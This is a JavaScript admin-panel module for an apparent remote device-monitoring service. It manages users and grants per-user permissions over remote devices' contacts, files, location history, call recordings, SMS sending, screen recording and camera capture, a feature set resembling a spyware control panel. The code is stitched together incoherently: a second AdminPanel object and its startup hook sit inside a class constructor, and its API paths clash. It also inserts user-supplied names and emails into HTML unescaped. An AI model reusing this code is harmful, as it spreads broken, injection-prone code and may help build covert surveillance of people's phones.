// public/admin/js/modules/core/AdminPanel.js
import AuthService from '../services/AuthService.js';
import {ApiService} from '../services/ApiService.js';
import { DeviceManager } from './DeviceManager.js';
import { WebSocketService } from './WebSocketService.js';
import { UIManager } from '../ui/UIManager.js';
import { handleError, withErrorBoundary } from '../utils/errorHandler.js';

// Small helper: color palette for devices
const COLORS = [
    "#1f77b4","#ff7f0e","#2ca02c","#d62728","#9467bd","#8c564b","#e377c2","#7f7f7f","#bcbd22","#17becf"
];

export class AdminPanel {
    constructor() {
        this.token = AuthService.getToken();
        if (!this.token) throw new Error("Auth token missing. AdminPanel should be loaded after login.");

        // core modules
        this.ui = new UIManager();
        this.api = new ApiService(this.token);
        this.api.ui = this.ui;
        this.api.auth = AuthService;

        this.deviceManager = new DeviceManager(this.api);
        this.deviceManager.ui = this.ui;

        (function (window, document) {
            'use strict';

            // ---------------------------------------------------------------------------
            // Helpers: API + UI wrappers (thin shims around your existing modules)
            // ---------------------------------------------------------------------------

            const api = {
                get(url, params) {
                    return window.ApiService
                        ? window.ApiService.get(url, params)
                        : Promise.reject(new Error("ApiService missing"));
                },
                post(url, body) {
                    return window.ApiService
                        ? window.ApiService.post(url, body)
                        : Promise.reject(new Error("ApiService missing"));
                },
                put(url, body) {
                    return window.ApiService
                        ? window.ApiService.put(url, body)
                        : Promise.reject(new Error("ApiService missing"));
                },
                del(url) {
                    return window.ApiService
                        ? window.ApiService.delete(url)
                        : Promise.reject(new Error("ApiService missing"));
                }

            };

            const ui = {
                showToast(message, type = 'info') {
                    if (window.UIManager && typeof window.UIManager.showToast === 'function') {
                        window.UIManager.showToast(message, type);
                    } else {
                        // fallback
                        console.log(`[${type.toUpperCase()}] ${message}`);
                    }
                },
                showLoader(show, text) {
                    if (window.UIManager && typeof window.UIManager.setLoading === 'function') {
                        window.UIManager.setLoading(show, text);
                    }
                },
                showModal({
                              title,
                              body,
                              size = 'lg',
                              primaryText = 'OK',
                              secondaryText = 'Cancel',
                              onPrimary,
                              onSecondary
                          }) {
                    if (window.Modal && typeof window.Modal.open === 'function') {
                        return window.Modal.open({
                            title,
                            body,
                            size,
                            primaryText,
                            secondaryText,
                            onPrimary,
                            onSecondary
                        });
                    }
                    // Minimal fallback modal behavior
                    const wrapper = document.createElement('div');
                    wrapper.innerHTML = `<div><h3>${title}</h3><div>${body}</div></div>`;
                    document.body.appendChild(wrapper);
                    return {
                        close() {
                            document.body.removeChild(wrapper);
                        },
                        el: wrapper
                    };
                }
            };

            const auth = {
                getCurrentUser() {
                    if (window.AuthService && typeof window.AuthService.getCurrentUser === 'function') {
                        return window.AuthService.getCurrentUser();
                    }
                    return null;
                },
                logout() {
                    if (window.AuthService && typeof window.AuthService.logout === 'function') {
                        window.AuthService.logout();
                    }
                }
            };

            // ---------------------------------------------------------------------------
            // RBAC-aware Users Manager
            // ---------------------------------------------------------------------------

            const UsersManager = {
                state: {
                    roles: [],
                    users: [],
                    currentPage: 1,
                    totalPages: 1,
                    search: '',
                    status: '',
                    roleFilter: ''
                },

                async init() {
                    this.section = document.getElementById('section-users');
                    if (!this.section) return;

                    this.renderBaseLayout();
                    await this.loadRoles();
                    await this.loadUsers();

                    this.bindEvents();
                },

                renderBaseLayout() {
                    this.section.innerHTML = `
        <div class="d-flex justify-content-between align-items-center mb-3">
          <h2 class="h4 mb-0">User Management</h2>
          <div>
            <button id="btn-refresh-users" class="btn btn-outline-secondary btn-sm me-2">
              <i class="bi bi-arrow-clockwise"></i> Refresh
            </button>
            <button id="btn-add-user" class="btn btn-primary btn-sm">
              <i class="bi bi-person-plus"></i> Add User
            </button>
          </div>
        </div>

        <div class="row g-2 mb-3">
          <div class="col-md-4">
            <input type="text" id="users-search" class="form-control form-control-sm" placeholder="Search users by name or email">
          </div>
          <div class="col-md-3">
            <select id="users-role-filter" class="form-select form-select-sm">
              <option value="">Filter by role</option>
            </select>
          </div>
          <div class="col-md-3">
            <select id="users-status-filter" class="form-select form-select-sm">
              <option value="">All statuses</option>
              <option value="active">Active</option>
              <option value="inactive">Inactive</option>
            </select>
          </div>
        </div>

        <div class="table-responsive">
          <table class="table table-sm table-hover align-middle">
            <thead class="table-light">
              <tr>
                <th style="width: 32px;">#</th>
                <th>User</th>
                <th>Email</th>
                <th style="width: 120px;">Status</th>
                <th style="width: 220px;">Roles</th>
                <th style="width: 150px;">Last login</th>
                <th style="width: 180px;">Actions</th>
              </tr>
            </thead>
            <tbody id="users-table-body">
              <tr><td colspan="7" class="text-center text-muted py-3">Loading...</td></tr>
            </tbody>
          </table>
        </div>

        <nav class="mt-2">
          <ul id="users-pagination" class="pagination pagination-sm justify-content-center mb-0"></ul>
        </nav>
      `;
                },

                bindEvents() {
                    const searchInput = this.section.querySelector('#users-search');
                    const roleFilter = this.section.querySelector('#users-role-filter');
                    const statusFilter = this.section.querySelector('#users-status-filter');
                    const refreshBtn = this.section.querySelector('#btn-refresh-users');
                    const addUserBtn = this.section.querySelector('#btn-add-user');

                    if (searchInput) {
                        searchInput.addEventListener('input', () => {
                            this.state.search = searchInput.value.trim();
                            this.loadUsers(1);
                        });
                    }

                    if (roleFilter) {
                        roleFilter.addEventListener('change', () => {
                            this.state.roleFilter = roleFilter.value;
                            this.loadUsers(1);
                        });
                    }

                    if (statusFilter) {
                        statusFilter.addEventListener('change', () => {
                            this.state.status = statusFilter.value;
                            this.loadUsers(1);
                        });
                    }

                    if (refreshBtn) {
                        refreshBtn.addEventListener('click', () => this.loadUsers(this.state.currentPage));
                    }

                    if (addUserBtn) {
                        addUserBtn.addEventListener('click', () => this.openCreateUserModal());
                    }
                },

                // ---------------- API helpers with fallback (/api/rbac/* preferred) --------------

                async _get(path, fallbackPath, params) {
                    try {
                        return await api.get(`/api${path}`, params);
                    } catch (err) {
                        if (fallbackPath) {
                            return api.get(`/api${fallbackPath}`, params);
                        }
                        throw err;
                    }
                },

                async _post(path, fallbackPath, body) {
                    try {
                        return await api.post(`/api${path}`, body);
                    } catch (err) {
                        if (fallbackPath) {
                            return api.post(`/api${fallbackPath}`, body);
                        }
                        throw err;
                    }
                },

                async _put(path, fallbackPath, body) {
                    try {
                        return await api.put(`/api${path}`, body);
                    } catch (err) {
                        if (fallbackPath) {
                            return api.put(`/api${fallbackPath}`, body);
                        }
                        throw err;
                    }
                },

                // ---------------- Data loading -----------------------------------

                async loadRoles() {
                    try {
                        const res = await api.get('/rbac/roles');
                        const roles = res?.data?.roles || res?.roles || [];
                        this.state.roles = roles;

                        const filter = this.section.querySelector('#users-role-filter');
                        if (filter) {
                            filter.innerHTML = '<option value="">Filter by role</option>';
                            roles.forEach((r) => {
                                filter.insertAdjacentHTML(
                                    'beforeend',
                                    `<option value="${r.id}">${r.name}</option>`
                                );
                            });
                        }
                    } catch (err) {
                        console.error('Failed to load roles', err);
                        ui.showToast('Failed to load roles', 'danger');
                    }
                },

                async loadUsers(page = 1) {
                    this.state.currentPage = page;
                    const tbody = this.section.querySelector('#users-table-body');
                    if (!tbody) return;

                    tbody.innerHTML = `<tr><td colspan="7" class="text-center text-muted py-3">Loading...</td></tr>`;

                    const params = {
                        page,
                        q: this.state.search || undefined,
                        role: this.state.roleFilter || undefined,
                        status: this.state.status || undefined
                    };

                    try {
                        // prefer /api/rbac/users – fallback to /api/users
                        const res = await this._get('/rbac/users', '/users', params);

                        const users =
                            res?.data?.users ||
                            res?.users ||
                            res?.data ||
                            [];

                        const pagination =
                            res?.data?.pagination ||
                            res?.pagination ||
                            {current_page: 1, total_pages: 1};

                        this.state.users = users;
                        this.state.totalPages = pagination.total_pages || 1;

                        this.renderUsersTable();
                        this.renderPagination();
                    } catch (err) {
                        console.error('Failed to load users', err);
                        ui.showToast('Failed to load users', 'danger');
                        tbody.innerHTML = `<tr><td colspan="7" class="text-center text-danger py-3">Failed to load users</td></tr>`;
                    }
                },

                renderUsersTable() {
                    const tbody = this.section.querySelector('#users-table-body');
                    if (!tbody) return;

                    if (!this.state.users.length) {
                        tbody.innerHTML = `<tr><td colspan="7" class="text-center text-muted py-3">No users found</td></tr>`;
                        return;
                    }

                    const rows = this.state.users
                        .map((u, idx) => {
                            const roles = u.roles || [];
                            const lastLogin = u.lastLogin || u.last_login || '—';
                            const isActive = u.isActive ?? u.is_active ?? true;

                            const options = this.state.roles
                                .map((r) => {
                                    const selected = roles.some((ur) => ur.id === r.id) ? 'selected' : '';
                                    return `<option value="${r.id}" ${selected}>${r.name}</option>`;
                                })
                                .join('');

                            return `
            <tr data-user-id="${u.id}">
              <td>${idx + 1 + (this.state.currentPage - 1) * 10}</td>
              <td>
                <div class="fw-semibold">${u.name || u.username || 'User #' + u.id}</div>
                <div class="small text-muted">ID: ${u.id}</div>
              </td>
              <td>${u.email || '—'}</td>
              <td>
                <span class="badge rounded-pill status-toggle ${isActive ? 'bg-success' : 'bg-secondary'}" data-id="${u.id}" style="cursor:pointer;">
                  ${isActive ? 'Active' : 'Inactive'}
                </span>
              </td>
              <td>
                <select class="form-select form-select-sm user-role-select" data-id="${u.id}" multiple>
                  ${options}
                </select>
              </td>
              <td>${lastLogin}</td>
              <td>
                <div class="btn-group btn-group-sm" role="group">
                  <button type="button" class="btn btn-outline-primary btn-user-access" data-id="${u.id}">
                    Access
                  </button>
                  <button type="button" class="btn btn-outline-secondary btn-user-reset" data-id="${u.id}">
                    Reset PW
                  </button>
                  <button type="button" class="btn btn-outline-danger btn-user-delete" data-id="${u.id}">
                    Delete
                  </button>
                </div>
              </td>
            </tr>
          `;
                        })
                        .join('');

                    tbody.innerHTML = rows;

                    this.bindRowEvents();
                },

                renderPagination() {
                    const ul = this.section.querySelector('#users-pagination');
                    if (!ul) return;

                    const total = this.state.totalPages || 1;
                    const current = this.state.currentPage || 1;

                    if (total <= 1) {
                        ul.innerHTML = '';
                        return;
                    }

                    let html = '';

                    for (let p = 1; p <= total; p++) {
                        html += `
          <li class="page-item ${p === current ? 'active' : ''}">
            <a class="page-link users-page-link" href="#" data-page="${p}">${p}</a>
          </li>`;
                    }

                    ul.innerHTML = html;

                    ul.querySelectorAll('.users-page-link').forEach((a) => {
                        a.addEventListener('click', (e) => {
                            e.preventDefault();
                            const page = parseInt(a.getAttribute('data-page'), 10) || 1;
                            this.loadUsers(page);
                        });
                    });
                },

                bindRowEvents() {
                    const section = this.section;

                    section.querySelectorAll('.status-toggle').forEach((el) => {
                        el.addEventListener('click', () => {
                            const id = el.getAttribute('data-id');
                            this.toggleUserStatus(id);
                        });
                    });

                    section.querySelectorAll('.user-role-select').forEach((el) => {
                        el.addEventListener('change', () => {
                            const id = el.getAttribute('data-id');
                            const roleIds = Array.from(el.selectedOptions).map((o) => o.value);
                            this.updateUserRoles(id, roleIds);
                        });
                    });

                    section.querySelectorAll('.btn-user-access').forEach((el) => {
                        el.addEventListener('click', () => {
                            const id = el.getAttribute('data-id');
                            this.openAccessModal(id);
                        });
                    });

                    section.querySelectorAll('.btn-user-reset').forEach((el) => {
                        el.addEventListener('click', () => {
                            const id = el.getAttribute('data-id');
                            this.resetUserPassword(id);
                        });
                    });

                    section.querySelectorAll('.btn-user-delete').forEach((el) => {
                        el.addEventListener('click', () => {
                            const id = el.getAttribute('data-id');
                            this.deleteUser(id);
                        });
                    });
                },

                // ---------------- Row actions --------------------------

                async toggleUserStatus(userId) {
                    try {
                        await api.put(`/api/users/${userId}/status`, {});
                        ui.showToast('User status updated', 'success');
                        this.loadUsers(this.state.currentPage);
                    } catch (err) {
                        console.error('Failed to toggle status', err);
                        ui.showToast('Failed to update status', 'danger');
                    }
                },

                async updateUserRoles(userId, roleIds) {
                    try {
                        await this._put(`/rbac/users/${userId}/roles`, null, {
                            role_ids: roleIds
                        });
                        ui.showToast('User roles updated', 'success');
                    } catch (err) {
                        console.error('Failed to update roles', err);
                        ui.showToast('Failed to update roles', 'danger');
                    }
                },

                async resetUserPassword(userId) {
                    if (!confirm('Reset password for this user?')) return;
                    try {
                        await api.post(`/users/${userId}/reset-password`, {});
                        ui.showToast('Password reset link sent / password reset', 'success');
                    } catch (err) {
                        console.error('Failed to reset password', err);
                        ui.showToast('Failed to reset password', 'danger');
                    }
                },

                async deleteUser(userId) {
                    if (!confirm('Are you sure you want to delete this user?')) return;
                    try {
                        await api.del(`/users/${userId}`);
                        ui.showToast('User deleted', 'success');
                        this.loadUsers(this.state.currentPage);
                    } catch (err) {
                        console.error('Failed to delete user', err);
                        ui.showToast('Failed to delete user', 'danger');
                    }
                },

                // ---------------- Access / Permission matrix ---------------------

                async openAccessModal(userId) {
                    ui.showLoader(true, 'Loading user access...');
                    try {
                        const res = await this._get(
                            `/rbac/users/${userId}/permissions`,
                            `/rbac/users/${userId}/access`
                        );
                        const user = res.user || res.data?.user;
                        const perms = res.permissions || res.data?.permissions || [];

                        const currentKeys = new Set(
                            perms
                                .map((p) =>
                                    p.key
                                        ? p.key
                                        : p.resource && p.action
                                            ? `${p.resource}.${p.action}`
                                            : ''
                                )
                                .filter(Boolean)
                        );

                        const body = this.renderAccessForm(currentKeys);

                        const modal = ui.showModal({
                            title: `Access control for ${user?.email || user?.name || 'User #' + userId}`,
                            body,
                            size: 'lg',
                            primaryText: 'Save',
                            secondaryText: 'Cancel',
                            onPrimary: async (instance) => {
                                const form = instance.el
                                    ? instance.el.querySelector('#user-access-form')
                                    : document.getElementById('user-access-form');
                                if (!form) return;

                                const data = new FormData(form);
                                const selected = data.getAll('perm'); // ["devices.view", "files.download", ...]

                                const payload = selected.map((key) => {
                                    const [resource, action] = key.split('.');
                                    return {resource, action};
                                });

                                try {
                                    await this._post(
                                        `/rbac/users/${userId}/permissions`,
                                        `/rbac/users/${userId}/permissions`,
                                        {permissions: payload}
                                    );
                                    ui.showToast('Permissions updated', 'success');
                                    if (instance && typeof instance.close === 'function') {
                                        instance.close();
                                    }
                                } catch (err) {
                                    console.error('Failed to save permissions', err);
                                    ui.showToast('Failed to save permissions', 'danger');
                                }
                            }
                        });

                        return modal;
                    } catch (err) {
                        console.error('Failed to open access modal', err);
                        ui.showToast('Failed to load permissions', 'danger');
                    } finally {
                        ui.showLoader(false);
                    }
                },

                renderAccessForm(currentKeys) {
                    const modules = [
                        {label: 'Dashboard', resource: 'dashboard', actions: ['view']},
                        {label: 'Devices', resource: 'devices', actions: ['view', 'manage', 'delete']},
                        {label: 'Contacts', resource: 'contacts', actions: ['view', 'edit', 'export']},
                        {label: 'File Explorer', resource: 'files', actions: ['view', 'upload', 'download', 'delete']},
                        {label: 'Location', resource: 'location', actions: ['view', 'history', 'delete']},
                        {label: 'Calls', resource: 'calls', actions: ['view']},
                        {label: 'Recordings', resource: 'recordings', actions: ['view', 'download', 'delete']},
                        {label: 'SMS', resource: 'sms', actions: ['view', 'send', 'delete']},
                        {label: 'Apps', resource: 'apps', actions: ['view', 'manage']},
                        {label: 'Screen', resource: 'screen', actions: ['capture', 'record']},
                        {label: 'Camera', resource: 'camera', actions: ['capture']},
                        {label: 'Users', resource: 'users', actions: ['view', 'manage']},
                        {label: 'RBAC', resource: 'rbac', actions: ['manage']},
                        {label: 'Settings', resource: 'settings', actions: ['view', 'manage']},
                        {label: 'Logs', resource: 'logs', actions: ['view']}
                    ];

                    const rows = modules
                        .map((m) => {
                            const checks = m.actions
                                .map((action) => {
                                    const key = `${m.resource}.${action}`;
                                    const checked = currentKeys.has(key) ? 'checked' : '';
                                    const id = `perm-${m.resource}-${action}`;
                                    return `
                <div class="form-check form-check-inline mb-1">
                  <input class="form-check-input" type="checkbox"
                         name="perm" id="${id}"
                         value="${key}" ${checked}>
                  <label class="form-check-label small" for="${id}">
                    ${action}
                  </label>
                </div>
              `;
                                })
                                .join('');

                            return `
            <tr>
              <td class="fw-semibold">${m.label}</td>
              <td>${checks}</td>
            </tr>
          `;
                        })
                        .join('');

                    return `
        <form id="user-access-form">
          <p class="text-muted small mb-2">
            Admin users always have full access. These overrides apply to non-admin users.
          </p>
          <div class="table-responsive" style="max-height: 420px; overflow:auto;">
            <table class="table table-sm align-middle">
              <thead class="table-light">
                <tr>
                  <th>Module / Feature</th>
                  <th>Allowed actions</th>
                </tr>
              </thead>
              <tbody>
                ${rows}
              </tbody>
            </table>
          </div>
        </form>
      `;
                },

                // ---------------- Create user (simple stub – can extend) ---------

                openCreateUserModal() {
                    const body = `
        <form id="create-user-form">
          <div class="mb-2">
            <label class="form-label">Name</label>
            <input type="text" name="name" class="form-control form-control-sm" required>
          </div>
          <div class="mb-2">
            <label class="form-label">Email</label>
            <input type="email" name="email" class="form-control form-control-sm" required>
          </div>
          <div class="mb-2">
            <label class="form-label">Initial password</label>
            <input type="password" name="password" class="form-control form-control-sm" required>
          </div>
          <div class="mb-2">
            <label class="form-label">Role</label>
            <select name="role" class="form-select form-select-sm">
              <option value="user">User</option>
              <option value="admin">Admin</option>
            </select>
          </div>
        </form>
      `;

                    ui.showModal({
                        title: 'Create User',
                        body,
                        size: 'md',
                        primaryText: 'Create',
                        secondaryText: 'Cancel',
                        onPrimary: async (instance) => {
                            const form = document.getElementById('create-user-form');
                            if (!form) return;

                            const fd = new FormData(form);
                            const payload = {
                                name: fd.get('name'),
                                email: fd.get('email'),
                                password: fd.get('password'),
                                role: fd.get('role')
                            };

                            try {
                                await api.post('/api/users', payload);
                                ui.showToast('User created', 'success');
                                this.loadUsers(1);
                                if (instance && typeof instance.close === 'function') instance.close();
                            } catch (err) {
                                console.error('Failed to create user', err);
                                ui.showToast('Failed to create user', 'danger');
                            }
                        }
                    });
                }
            };

            // ---------------------------------------------------------------------------
            // AdminPanel root controller – keeps other tabs working
            // ---------------------------------------------------------------------------

            const AdminPanel = {
                init() {
                    this.cacheElements();
                    this.bindGlobalEvents();
                    this.showSection('dashboard');

                    // Initialize Users tab RBAC UI
                    UsersManager.init();

                    // Other tab initializers (Dashboard, Devices, Settings) can stay as you had them
                    // or be added here if needed.
                },

                cacheElements() {
                    this.navLinks = document.querySelectorAll('[data-nav-section]');
                    this.sections = {
                        dashboard: document.getElementById('section-dashboard'),
                        devices: document.getElementById('section-devices'),
                        users: document.getElementById('section-users'),
                        settings: document.getElementById('section-settings')
                    };
                },

                bindGlobalEvents() {
                    if (this.navLinks) {
                        this.navLinks.forEach((link) => {
                            link.addEventListener('click', (e) => {
                                e.preventDefault();
                                const target = link.getAttribute('data-nav-section');
                                if (target) {
                                    this.showSection(target);
                                }
                            });
                        });
                    }

                    const logoutBtn = document.getElementById('btn-logout');
                    if (logoutBtn) {
                        logoutBtn.addEventListener('click', () => {
                            auth.logout();
                        });
                    }
                },

                showSection(name) {
                    Object.keys(this.sections).forEach((key) => {
                        const sec = this.sections[key];
                        if (!sec) return;
                        sec.style.display = key === name ? '' : 'none';
                    });

                    // Optional: mark active nav
                    if (this.navLinks) {
                        this.navLinks.forEach((link) => {
                            const target = link.getAttribute('data-nav-section');
                            if (target === name) link.classList.add('active');
                            else link.classList.remove('active');
                        });
                    }
                }
            };

            // Expose globally
            window.AdminPanel = AdminPanel;

            document.addEventListener('DOMContentLoaded', () => {
                try {
                    AdminPanel.init();
                } catch (err) {
                    console.error('Failed to initialize AdminPanel', err);
                }
            });

        })(window, document);
    }
}
